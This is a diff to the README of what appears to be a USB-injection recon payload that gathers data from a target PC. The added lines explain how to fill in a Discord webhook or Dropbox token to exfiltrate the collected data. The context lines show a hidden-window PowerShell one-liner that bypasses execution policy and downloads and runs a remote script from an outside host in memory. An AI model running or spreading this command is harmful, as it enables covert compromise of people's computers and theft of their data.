@@ -55,6 +55,13 @@ This program enumerates a target PC to collect as much recon data as possible fo
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+
+`$dc` is the variable that stores your discord webhook 
+
+`$db` is the variable that stores your dropbox token 
+
+Fill in either or both of these to methods to exfil your collected data
+
 ```
 powershell -w h -NoP -Ep Bypass $dc='';$db='';iwr jakoby.lol/aucrjmf | iex
 ```
